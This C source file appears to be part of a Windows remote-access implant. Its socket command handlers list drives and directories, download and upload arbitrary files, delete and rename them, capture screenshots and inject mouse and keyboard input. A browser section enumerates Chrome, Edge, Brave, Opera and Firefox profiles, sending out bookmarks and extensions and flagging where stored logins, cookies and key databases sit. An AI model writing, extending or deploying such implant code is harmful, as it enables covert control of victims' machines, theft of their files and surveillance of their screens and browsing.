#include "implant.h"
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>
#include <ole2.h>

#ifndef INITGUID
#define INITGUID
#endif
#include <guiddef.h>

int send_blob(SOCKET s, const unsigned char* p, int n) {
    while (n > 0) {
        int c = n > CHUNK ? CHUNK : n;
        if (send_frame(s, RSP_DATA, p, c) != 0) return -1;
        p += c;
        n -= c;
    }
    return 0;
}

int send_err(SOCKET s, const char* msg) {
    return send_frame(s, RSP_ERR, (const unsigned char*)msg, (int)strlen(msg));
}

static int utf8_to_wide(const char* u, wchar_t* w, int cap) {
    int n = MultiByteToWideChar(CP_UTF8, 0, u, -1, w, cap);
    return n > 0 ? n : 0;
}

static int wide_to_utf8(const wchar_t* w, char* u, int cap) {
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, u, cap, NULL, NULL);
    return n > 0 ? n : 0;
}

static void append(char** buf, int* len, int* cap, const char* s) {
    int n = (int)strlen(s);
    if (*len + n + 1 > *cap) {
        int nc = (*cap + n + 4096) * 2;
        char* p = (char*)realloc(*buf, nc);
        if (!p) return;
        *buf = p;
        *cap = nc;
    }
    memcpy(*buf + *len, s, n);
    *len += n;
    (*buf)[*len] = 0;
}

void handle_fs_ls(SOCKET s, const char* path) {
    char* out = (char*)malloc(4096);
    int len = 0, cap = 4096;
    if (!out) {
        send_err(s, "nomem");
        return;
    }
    out[0] = 0;
    if (!path || !path[0] || (path[0] == '/' && !path[1]) || (path[0] == '\\' && !path[1])) {
        char drives[256];
        DWORD n = GetLogicalDriveStringsA(sizeof(drives), drives);
        char* p = drives;
        if (n == 0 || n > sizeof(drives)) {
            free(out);
            send_err(s, "drives fail");
            return;
        }
        while (*p) {
            append(&out, &len, &cap, "D\t");
            append(&out, &len, &cap, p);
            append(&out, &len, &cap, "\n");
            p += strlen(p) + 1;
        }
    } else {
        wchar_t wpath[520], pattern[530];
        WIN32_FIND_DATAW fd;
        HANDLE h;
        if (!utf8_to_wide(path, wpath, 520)) {
            free(out);
            send_err(s, "bad path");
            return;
        }
        {
            size_t L = wcslen(wpath);
            if (L > 0 && wpath[L - 1] != L'\\' && wpath[L - 1] != L'/')
                _snwprintf(pattern, 530, L"%s\\*", wpath);
            else
                _snwprintf(pattern, 530, L"%s*", wpath);
        }
        h = FindFirstFileW(pattern, &fd);
        if (h == INVALID_HANDLE_VALUE) {
            free(out);
            send_err(s, "list fail");
            return;
        }
        do {
            char name[780], line[860];
            if (fd.cFileName[0] == L'.' && (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
                continue;
            if (!wide_to_utf8(fd.cFileName, name, (int)sizeof(name))) continue;
            {
                ULONGLONG ft = ((ULONGLONG)fd.ftLastWriteTime.dwHighDateTime << 32) | fd.ftLastWriteTime.dwLowDateTime;
                unsigned long long unix_ts = ft ? (ft / 10000000ULL) - 11644473600ULL : 0;
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                    _snprintf(line, sizeof(line), "D\t%s\t0\t%llu\n", name, unix_ts);
                else {
                    ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
                    _snprintf(line, sizeof(line), "F\t%s\t%llu\t%llu\n", name, sz, unix_ts);
                }
            }
            append(&out, &len, &cap, line);
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
    if (len == 0) append(&out, &len, &cap, "");
    send_blob(s, (unsigned char*)out, len);
    send_frame(s, RSP_END, NULL, 0);
    free(out);
}

static void parse_get_arg(const char* arg, ULONGLONG* off, ULONGLONG* maxn, const char** path) {
    const char *n1, *n2, *p;
    *off = 0;
    *maxn = 0;
    *path = arg ? arg : "";
    if (!arg) return;
    n1 = strchr(arg, '\n');
    if (!n1) return;
    n2 = strchr(n1 + 1, '\n');
    if (!n2) return;
    for (p = arg; p < n1; p++) if (*p < '0' || *p > '9') return;
    for (p = n1 + 1; p < n2; p++) if (*p < '0' || *p > '9') return;
    *off = _strtoui64(arg, NULL, 10);
    *maxn = _strtoui64(n1 + 1, NULL, 10);
    *path = n2 + 1;
}

void handle_fs_get(SOCKET s, const char* arg) {
    wchar_t wpath[520];
    HANDLE h;
    unsigned char chunk[CHUNK];
    DWORD rd = 0;
    ULONGLONG off = 0, maxn = 0, sent = 0;
    const char* path = arg;
    LARGE_INTEGER li;
    parse_get_arg(arg, &off, &maxn, &path);
    if (!path || !path[0] || !utf8_to_wide(path, wpath, 520)) {
        send_err(s, "bad path");
        return;
    }
    h = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        send_err(s, "open fail");
        return;
    }
    if (off) {
        li.QuadPart = (LONGLONG)off;
        if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) {
            CloseHandle(h);
            send_err(s, "seek fail");
            return;
        }
    }
    for (;;) {
        DWORD want = sizeof(chunk);
        if (maxn && sent + want > maxn) {
            if (sent >= maxn) break;
            want = (DWORD)(maxn - sent);
        }
        if (!ReadFile(h, chunk, want, &rd, NULL)) {
            CloseHandle(h);
            send_err(s, "read fail");
            return;
        }
        if (rd == 0) break;
        sent += rd;
        if (send_frame(s, RSP_DATA, chunk, (int)rd) != 0) {
            CloseHandle(h);
            return;
        }
        if (maxn && sent >= maxn) break;
    }
    CloseHandle(h);
    send_frame(s, RSP_END, NULL, 0);
}

static HANDLE g_puth = INVALID_HANDLE_VALUE;

void handle_fs_put(SOCKET s, const unsigned char* p, int n) {
    unsigned char op;
    DWORD wr = 0;
    if (n < 1) {
        send_err(s, "bad put");
        return;
    }
    op = p[0];
    if (op == 0) {
        unsigned short plen;
        char path[520];
        wchar_t wpath[520];
        if (g_puth != INVALID_HANDLE_VALUE) {
            CloseHandle(g_puth);
            g_puth = INVALID_HANDLE_VALUE;
        }
        if (n < 3) {
            send_err(s, "bad path");
            return;
        }
        plen = (unsigned short)(p[1] | (p[2] << 8));
        if (plen == 0 || plen >= (unsigned short)sizeof(path) || 3 + plen > n) {
            send_err(s, "bad path");
            return;
        }
        memcpy(path, p + 3, plen);
        path[plen] = 0;
        if (!utf8_to_wide(path, wpath, 520)) {
            send_err(s, "bad path");
            return;
        }
        {
            ULONGLONG off = 0;
            DWORD disp = CREATE_ALWAYS;
            if (3 + plen + 8 <= n) {
                off = (ULONGLONG)p[3 + plen] | ((ULONGLONG)p[4 + plen] << 8) | ((ULONGLONG)p[5 + plen] << 16) | ((ULONGLONG)p[6 + plen] << 24)
                    | ((ULONGLONG)p[7 + plen] << 32) | ((ULONGLONG)p[8 + plen] << 40) | ((ULONGLONG)p[9 + plen] << 48) | ((ULONGLONG)p[10 + plen] << 56);
                disp = off ? OPEN_ALWAYS : CREATE_ALWAYS;
            }
            g_puth = CreateFileW(wpath, GENERIC_WRITE, 0, NULL, disp, FILE_ATTRIBUTE_NORMAL, NULL);
            if (g_puth == INVALID_HANDLE_VALUE) {
                send_err(s, "write fail");
                return;
            }
            if (off) {
                LARGE_INTEGER li;
                li.QuadPart = (LONGLONG)off;
                if (!SetFilePointerEx(g_puth, li, NULL, FILE_BEGIN)) {
                    CloseHandle(g_puth);
                    g_puth = INVALID_HANDLE_VALUE;
                    send_err(s, "seek fail");
                }
            }
        }
        return;
    }
    if (op == 1) {
        if (g_puth == INVALID_HANDLE_VALUE) {
            send_err(s, "write fail");
            return;
        }
        if (n > 1 && !WriteFile(g_puth, p + 1, (DWORD)(n - 1), &wr, NULL)) {
            CloseHandle(g_puth);
            g_puth = INVALID_HANDLE_VALUE;
            send_err(s, "write fail");
        }
        return;
    }
    if (op == 2) {
        if (g_puth != INVALID_HANDLE_VALUE) {
            CloseHandle(g_puth);
            g_puth = INVALID_HANDLE_VALUE;
        }
        send_frame(s, RSP_END, NULL, 0);
        return;
    }
    send_err(s, "bad op");
}

void handle_fs_del(SOCKET s, const char* path) {
    wchar_t wpath[520];
    if (!path || !path[0] || !utf8_to_wide(path, wpath, 520)) {
        send_err(s, "bad path");
        return;
    }
    if (RemoveDirectoryW(wpath) || DeleteFileW(wpath)) {
        send_frame(s, RSP_END, NULL, 0);
        return;
    }
    send_err(s, "delete fail");
}

void handle_fs_mkdir(SOCKET s, const char* path) {
    wchar_t wpath[520];
    if (!path || !path[0] || !utf8_to_wide(path, wpath, 520)) {
        send_err(s, "bad path");
        return;
    }
    if (CreateDirectoryW(wpath, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        send_frame(s, RSP_END, NULL, 0);
        return;
    }
    send_err(s, "mkdir fail");
}

void handle_fs_ren(SOCKET s, const char* spec) {
    char from[520], to[520];
    wchar_t wfrom[520], wto[520];
    const char* nl;
    int n;
    if (!spec || !spec[0]) {
        send_err(s, "bad path");
        return;
    }
    nl = strchr(spec, '\n');
    if (!nl || nl == spec || !nl[1]) {
        send_err(s, "bad path");
        return;
    }
    n = (int)(nl - spec);
    if (n >= (int)sizeof(from)) n = (int)sizeof(from) - 1;
    memcpy(from, spec, (size_t)n);
    from[n] = 0;
    strncpy(to, nl + 1, sizeof(to) - 1);
    to[sizeof(to) - 1] = 0;
    if (!utf8_to_wide(from, wfrom, 520) || !utf8_to_wide(to, wto, 520)) {
        send_err(s, "bad path");
        return;
    }
    if (MoveFileW(wfrom, wto)) {
        send_frame(s, RSP_END, NULL, 0);
        return;
    }
    send_err(s, "rename fail");
}

typedef int GpStatus;
typedef void GpBitmap;
typedef void GpImage;
typedef struct {
    UINT32 GdiplusVersion;
    void* DebugEventCallback;
    BOOL SuppressBackgroundThread;
    BOOL SuppressExternalCodecs;
} GdStartupInput;

typedef struct {
    CLSID Clsid;
    GUID FormatID;
    wchar_t* CodecName;
    wchar_t* DllName;
    wchar_t* FormatDescription;
    wchar_t* FilenameExtension;
    wchar_t* MimeType;
    void* SigPattern;
    void* SigMask;
    UINT SigCount;
    UINT Flags;
    UINT Version;
} ImageCodecInfo;

static int jpeg_from_bmp(HBITMAP hbmp, int quality, unsigned char** out, int* outlen) {
    HMODULE gd, ole;
    ULONG_PTR token = 0;
    GdStartupInput si;
    GpStatus st;
    GpBitmap* img = NULL;
    IStream* stream = NULL;
    HGLOBAL hg = NULL;
    UINT n = 0, sz = 0;
    ImageCodecInfo* inf = NULL;
    CLSID jpegClsid;
    int ok = 0;
    unsigned i;
    typedef GpStatus (WINAPI *Startup_t)(ULONG_PTR*, const GdStartupInput*, void*);
    typedef void (WINAPI *Shutdown_t)(ULONG_PTR);
    typedef GpStatus (WINAPI *FromBmp_t)(HBITMAP, HPALETTE, GpBitmap**);
    typedef GpStatus (WINAPI *Dispose_t)(GpImage*);
    typedef GpStatus (WINAPI *EncSize_t)(UINT*, UINT*);
    typedef GpStatus (WINAPI *EncGet_t)(UINT, UINT, ImageCodecInfo*);
    typedef struct {
        GUID Guid;
        ULONG NumberOfValues;
        ULONG Type;
        void* Value;
    } EncParam;
    typedef struct {
        UINT Count;
        EncParam Parameter[1];
    } EncParams;
    typedef GpStatus (WINAPI *SaveStream_t)(GpImage*, IStream*, const CLSID*, const EncParams*);
    typedef HRESULT (WINAPI *MkStream_t)(HGLOBAL, BOOL, IStream**);
    Startup_t pStartup;
    Shutdown_t pShutdown;
    FromBmp_t pFromBmp;
    Dispose_t pDispose;
    EncSize_t pEncSize;
    EncGet_t pEncGet;
    SaveStream_t pSave;
    MkStream_t pMk;
    memset(&si, 0, sizeof(si));
    si.GdiplusVersion = 1;
    memset(&jpegClsid, 0, sizeof(jpegClsid));
    gd = LoadLibraryA("gdiplus.dll");
    ole = LoadLibraryA("ole32.dll");
    if (!gd || !ole) return 0;
    pStartup = (Startup_t)GetProcAddress(gd, "GdiplusStartup");
    pShutdown = (Shutdown_t)GetProcAddress(gd, "GdiplusShutdown");
    pFromBmp = (FromBmp_t)GetProcAddress(gd, "GdipCreateBitmapFromHBITMAP");
    pDispose = (Dispose_t)GetProcAddress(gd, "GdipDisposeImage");
    pEncSize = (EncSize_t)GetProcAddress(gd, "GdipGetImageEncodersSize");
    pEncGet = (EncGet_t)GetProcAddress(gd, "GdipGetImageEncoders");
    pSave = (SaveStream_t)GetProcAddress(gd, "GdipSaveImageToStream");
    pMk = (MkStream_t)GetProcAddress(ole, "CreateStreamOnHGlobal");
    if (!pStartup || !pShutdown || !pFromBmp || !pDispose || !pEncSize || !pEncGet || !pSave || !pMk)
        goto done;
    if (pStartup(&token, &si, NULL) != 0) goto done;
    if (pFromBmp(hbmp, 0, &img) != 0 || !img) goto done;
    if (pEncSize(&n, &sz) != 0 || sz == 0) goto done;
    inf = (ImageCodecInfo*)malloc(sz);
    if (!inf) goto done;
    if (pEncGet(n, sz, inf) != 0) goto done;
    for (i = 0; i < n; i++) {
        if (inf[i].MimeType && wcscmp(inf[i].MimeType, L"image/jpeg") == 0) {
            jpegClsid = inf[i].Clsid;
            break;
        }
    }
    if (jpegClsid.Data1 == 0) goto done;
    if (pMk(NULL, TRUE, &stream) != S_OK || !stream) goto done;
    {
        EncParams ep;
        ULONG qv;
        GUID qguid = {0x1d5be4b5, 0xfa4a, 0x452d, {0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb}};
        if (quality < 40) quality = 40;
        if (quality > 95) quality = 95;
        qv = (ULONG)quality;
        memset(&ep, 0, sizeof(ep));
        ep.Count = 1;
        ep.Parameter[0].Guid = qguid;
        ep.Parameter[0].NumberOfValues = 1;
        ep.Parameter[0].Type = 4;
        ep.Parameter[0].Value = &qv;
        st = pSave((GpImage*)img, stream, &jpegClsid, &ep);
        if (st != 0) st = pSave((GpImage*)img, stream, &jpegClsid, NULL);
    }
    if (st != 0) goto done;
    if (GetHGlobalFromStream(stream, &hg) == S_OK && hg) {
        SIZE_T bytes = GlobalSize(hg);
        void* locked = GlobalLock(hg);
        if (locked && bytes > 0 && bytes < 8ull * 1024ull * 1024ull) {
            *out = (unsigned char*)malloc((size_t)bytes);
            if (*out) {
                memcpy(*out, locked, (size_t)bytes);
                *outlen = (int)bytes;
                ok = 1;
            }
        }
        if (locked) GlobalUnlock(hg);
    }
done:
    if (stream) stream->lpVtbl->Release(stream);
    if (img) pDispose((GpImage*)img);
    if (token) pShutdown(token);
    free(inf);
    if (gd) FreeLibrary(gd);
    if (ole) FreeLibrary(ole);
    return ok;
}

static HBITMAP grab(int max_w, int* dw, int* dh) {
    HDC sdc, mdc;
    HBITMAP bmp, old;
    int sw, sh;
    sdc = GetDC(NULL);
    if (!sdc) return NULL;
    sw = GetDeviceCaps(sdc, DESKTOPHORZRES);
    sh = GetDeviceCaps(sdc, DESKTOPVERTRES);
    if (sw <= 0) sw = GetSystemMetrics(SM_CXSCREEN);
    if (sh <= 0) sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0 || sh <= 0) {
        ReleaseDC(NULL, sdc);
        return NULL;
    }
    *dw = sw;
    *dh = sh;
    if (max_w > 0 && max_w <= 100) {
        *dw = sw * max_w / 100;
        *dh = sh * max_w / 100;
        if (*dw < 320) {
            *dw = 320;
            *dh = sh * 320 / sw;
        }
        if (*dh < 1) *dh = 1;
    } else if (max_w > 100 && sw > max_w) {
        *dw = max_w;
        *dh = sh * max_w / sw;
        if (*dh < 1) *dh = 1;
    }
    mdc = CreateCompatibleDC(sdc);
    bmp = CreateCompatibleBitmap(sdc, *dw, *dh);
    old = (HBITMAP)SelectObject(mdc, bmp);
    if (*dw == sw && *dh == sh) {
        BitBlt(mdc, 0, 0, *dw, *dh, sdc, 0, 0, SRCCOPY);
    } else {
        SetStretchBltMode(mdc, HALFTONE);
        SetBrushOrgEx(mdc, 0, 0, NULL);
        StretchBlt(mdc, 0, 0, *dw, *dh, sdc, 0, 0, sw, sh, SRCCOPY);
    }
    SelectObject(mdc, old);
    DeleteDC(mdc);
    ReleaseDC(NULL, sdc);
    return bmp;
}

void handle_screen(SOCKET s, int max_w, int quality, int send_end) {
    int dw = 0, dh = 0;
    unsigned char* jpg = NULL;
    int jlen = 0;
    unsigned char* payload = NULL;
    HBITMAP bmp = grab(max_w, &dw, &dh);
    if (!bmp) {
        if (send_end) send_err(s, "capture fail");
        return;
    }
    if (!jpeg_from_bmp(bmp, quality, &jpg, &jlen) || !jpg) {
        DeleteObject(bmp);
        if (send_end) send_err(s, "jpeg fail");
        return;
    }
    DeleteObject(bmp);
    if (jlen + 4 > BUF_SZ) {
        free(jpg);
        if (send_end) send_err(s, "too large");
        return;
    }
    payload = (unsigned char*)malloc((size_t)jlen + 4);
    if (!payload) {
        free(jpg);
        if (send_end) send_err(s, "nomem");
        return;
    }
    payload[0] = (unsigned char)(dw & 0xFF);
    payload[1] = (unsigned char)((dw >> 8) & 0xFF);
    payload[2] = (unsigned char)(dh & 0xFF);
    payload[3] = (unsigned char)((dh >> 8) & 0xFF);
    memcpy(payload + 4, jpg, (size_t)jlen);
    send_frame(s, RSP_FRAME, payload, jlen + 4);
    if (send_end) send_frame(s, RSP_END, NULL, 0);
    free(jpg);
    free(payload);
}

void handle_input(const unsigned char* p, int n) {
    unsigned char kind, down;
    int x, y;
    unsigned short code;
    INPUT in;
    if (n < 12) return;
    kind = p[0];
    x = (int)(int32_t)(p[1] | (p[2] << 8) | (p[3] << 16) | (p[4] << 24));
    y = (int)(int32_t)(p[5] | (p[6] << 8) | (p[7] << 16) | (p[8] << 24));
    code = (unsigned short)(p[9] | (p[10] << 8));
    down = p[11];
    memset(&in, 0, sizeof(in));
    if (kind == 1 || kind == 2 || kind == 3) {
        in.type = INPUT_MOUSE;
        if (x < 0) x = 0;
        if (y < 0) y = 0;
        if (x > 65535) x = 65535;
        if (y > 65535) y = 65535;
        in.mi.dx = x;
        in.mi.dy = y;
        if (kind == 3) {
            in.mi.dwFlags = MOUSEEVENTF_WHEEL;
            in.mi.mouseData = (DWORD)(int)(short)code;
        } else {
            in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
            if (kind == 2) {
                if (code == 2)
                    in.mi.dwFlags |= down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
                else if (code == 4)
                    in.mi.dwFlags |= down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
                else
                    in.mi.dwFlags |= down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
            }
        }
        SendInput(1, &in, sizeof(in));
    } else if (kind == 4) {
        in.type = INPUT_KEYBOARD;
        in.ki.wVk = code;
        if (!down) in.ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(1, &in, sizeof(in));
    }
}

/* ---- browser inventory: profile artifacts, bookmarks, extensions ----
   Read-only. Credential stores (Login Data / Cookies / key4.db) are reported
   as file metadata and never opened or decrypted. */

static void b_line(SOCKET s, const char* kind, const char* browser, const char* a,
                   const char* b, const char* c, long long n) {
    char line[1200];
    int len = snprintf(line, sizeof(line), "%s\t%s\t%s\t%s\t%s\t%lld\n", kind, browser, a, b, c, n);
    if (len > 0 && len < (int)sizeof(line)) send_frame(s, RSP_DATA, (const unsigned char*)line, len);
}

static void b_clean(char* dst, int cap, const char* src, int n) {
    int i = 0, j = 0;
    while (i < n && j < cap - 1) {
        char ch = src[i];
        if (ch == '\\' && i + 1 < n && (src[i + 1] == '"' || src[i + 1] == '\\')) {
            ch = src[i + 1];
            i++;
        }
        if (ch != '\t' && ch != '\n' && ch != '\r') dst[j++] = ch;
        i++;
    }
    dst[j] = 0;
}

/* Reads a whole file up to cap bytes; caller frees. */
static char* read_small(const char* path, int cap, int* outlen) {
    WIN32_FILE_ATTRIBUTE_DATA a;
    DWORD rd = 0, size;
    HANDLE h;
    char* buf;
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &a)) return NULL;
    size = a.nFileSizeLow;
    if (a.nFileSizeHigh || size == 0 || size > (DWORD)cap) return NULL;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    buf = (char*)malloc((size_t)size + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    if (!ReadFile(h, buf, size, &rd, NULL) || rd != size) {
        free(buf);
        CloseHandle(h);
        return NULL;
    }
    CloseHandle(h);
    buf[size] = 0;
    if (outlen) *outlen = (int)size;
    return buf;
}

static int json_value(const char* buf, const char* key, int klen, const char* in,
                      char* out, int cap) {
    const char* p;
    if (!in) in = buf;
    p = strstr(in, key);
    if (!p) return 0;
    p = strchr(p + klen, ':');
    if (!p) return 0;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return 0;
    p++;
    {
        const char* e = p;
        while (*e && *e != '"') {
            if (*e == '\\' && e[1]) e++;
            e++;
        }
        if (!*e) return 0;
        b_clean(out, cap, p, (int)(e - p));
    }
    return out[0] ? 1 : 0;
}

static void b_bookmarks(SOCKET s, const char* browser, const char* root, const char* profile) {
    char path[MAX_PATH], name[160], url[512];
    char* buf;
    int len = 0;
    const char* p;
    snprintf(path, sizeof(path), "%s\\%s\\Bookmarks", root, profile);
    buf = read_small(path, 4 * 1024 * 1024, &len);
    if (!buf) return;
    p = buf;
    for (;;) {
        const char* u = strstr(p, "\"url\"");
        const char* ue;
        if (!u) break;
        u = strchr(u + 5, ':');
        if (!u) break;
        u++;
        while (*u == ' ' || *u == '\t') u++;
        if (*u != '"') { p = u; continue; }
        u++;
        ue = strchr(u, '"');
        if (!ue) break;
        name[0] = 0;
        {
            const char* n = u;
            int back = 0;
            while (n > buf && back < 600) {
                n--; back++;
                if (*n == '"' && !strncmp(n, "\"name\"", 6)) break;
            }
            if (n > buf && !strncmp(n, "\"name\"", 6)) json_value(buf, "\"name\"", 6, n, name, sizeof(name));
        }
        b_clean(url, sizeof(url), u, (int)(ue - u));
        if (url[0]) b_line(s, "B", browser, profile, name, url, 0);
        p = ue + 1;
    }
    free(buf);
}

static void b_extensions(SOCKET s, const char* browser, const char* root, const char* profile) {
    char dir[MAX_PATH], pat[MAX_PATH], manifest[MAX_PATH];
    char name[160], version[32];
    WIN32_FIND_DATAA fd, vd;
    HANDLE h, vh;
    snprintf(dir, sizeof(dir), "%s\\%s\\Extensions", root, profile);
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    h = FindFirstFileA(pat, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] == '.') continue;
        snprintf(pat, sizeof(pat), "%s\\%s\\*", dir, fd.cFileName);
        vh = FindFirstFileA(pat, &vd);
        if (vh == INVALID_HANDLE_VALUE) continue;
        do {
            char* buf;
            if (!(vd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || vd.cFileName[0] == '.') continue;
            snprintf(manifest, sizeof(manifest), "%s\\%s\\%s\\manifest.json", dir, fd.cFileName, vd.cFileName);
            buf = read_small(manifest, 256 * 1024, NULL);
            if (!buf) continue;
            name[0] = 0;
            version[0] = 0;
            json_value(buf, "\"name\"", 6, buf, name, sizeof(name));
            json_value(buf, "\"version\"", 9, buf, version, sizeof(version));
            if (!name[0]) snprintf(name, sizeof(name), "%s", fd.cFileName);
            if (!version[0]) snprintf(version, sizeof(version), "%s", vd.cFileName);
            b_line(s, "E", browser, profile, name, version, 0);
            free(buf);
        } while (FindNextFileA(vh, &vd));
        FindClose(vh);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

static int browser_env_dir(const char* env, const char* sub, char* out, int cap) {
    char base[MAX_PATH];
    DWORD n = GetEnvironmentVariableA(env, base, sizeof(base));
    if (n == 0 || n >= sizeof(base)) return 0;
    snprintf(out, (size_t)cap, "%s\\%s", base, sub);
    return GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES;
}

static int file_stat(const char* path, long long* size, long long* mtime) {
    WIN32_FILE_ATTRIBUTE_DATA a;
    ULARGE_INTEGER t;
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &a)) return 0;
    if (a.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) return 0;
    *size = ((long long)a.nFileSizeHigh << 32) | a.nFileSizeLow;
    t.LowPart = a.ftLastWriteTime.dwLowDateTime;
    t.HighPart = a.ftLastWriteTime.dwHighDateTime;
    *mtime = (long long)(t.QuadPart / 10000000ULL) - 11644473600LL;
    return 1;
}

static void browser_profile(SOCKET s, const char* browser, const char* root,
                            const char* profile, const char* const* files) {
    char path[MAX_PATH], num[32];
    long long size = 0, mt = 0;
    int i;
    for (i = 0; files[i]; i++) {
        snprintf(path, sizeof(path), "%s\\%s\\%s", root, profile, files[i]);
        if (!file_stat(path, &size, &mt)) continue;
        snprintf(num, sizeof(num), "%lld", mt);
        b_line(s, "F", browser, profile, files[i], num, size);
    }
    b_bookmarks(s, browser, root, profile);
    b_extensions(s, browser, root, profile);
}

static void browser_version(SOCKET s, const char* browser, const char* root) {
    char path[MAX_PATH], v[64];
    DWORD rd = 0;
    HANDLE h;
    snprintf(path, sizeof(path), "%s\\Last Version", root);
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    memset(v, 0, sizeof(v));
    ReadFile(h, v, sizeof(v) - 1, &rd, NULL);
    CloseHandle(h);
    while (rd > 0 && (v[rd - 1] == '\n' || v[rd - 1] == '\r' || v[rd - 1] == ' ')) v[--rd] = 0;
    if (rd == 0) return;
    b_line(s, "V", browser, "-", v, "0", 0);
}

void handle_browser(SOCKET s) {
    static const struct { const char* name; const char* env; const char* sub; int firefox; } defs[] = {
        { "Chrome",   "LOCALAPPDATA", "Google\\Chrome\\User Data", 0 },
        { "Edge",     "LOCALAPPDATA", "Microsoft\\Edge\\User Data", 0 },
        { "Brave",    "LOCALAPPDATA", "BraveSoftware\\Brave-Browser\\User Data", 0 },
        { "Chromium", "LOCALAPPDATA", "Chromium\\User Data", 0 },
        { "Opera",    "APPDATA",      "Opera Software\\Opera Stable", 0 },
        { "Firefox",  "APPDATA",      "Mozilla\\Firefox\\Profiles", 1 },
    };
    static const char* chrome_files[] = {
        "History", "Bookmarks", "Cookies", "Login Data", "Web Data", "Preferences", NULL
    };
    static const char* firefox_files[] = {
        "places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "prefs.js", NULL
    };
    char root[MAX_PATH], pat[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    unsigned i;
    for (i = 0; i < sizeof(defs) / sizeof(defs[0]); i++) {
        if (!browser_env_dir(defs[i].env, defs[i].sub, root, (int)sizeof(root))) continue;
        snprintf(pat, sizeof(pat), "%s\\*", root);
        h = FindFirstFileA(pat, &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (fd.cFileName[0] == '.') continue;
            if (!defs[i].firefox && strcmp(fd.cFileName, "Default") != 0 &&
                strncmp(fd.cFileName, "Profile", 7) != 0) continue;
            browser_profile(s, defs[i].name, root, fd.cFileName,
                            defs[i].firefox ? firefox_files : chrome_files);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
        if (!defs[i].firefox) browser_version(s, defs[i].name, root);
    }
    send_frame(s, RSP_END, NULL, 0);
}
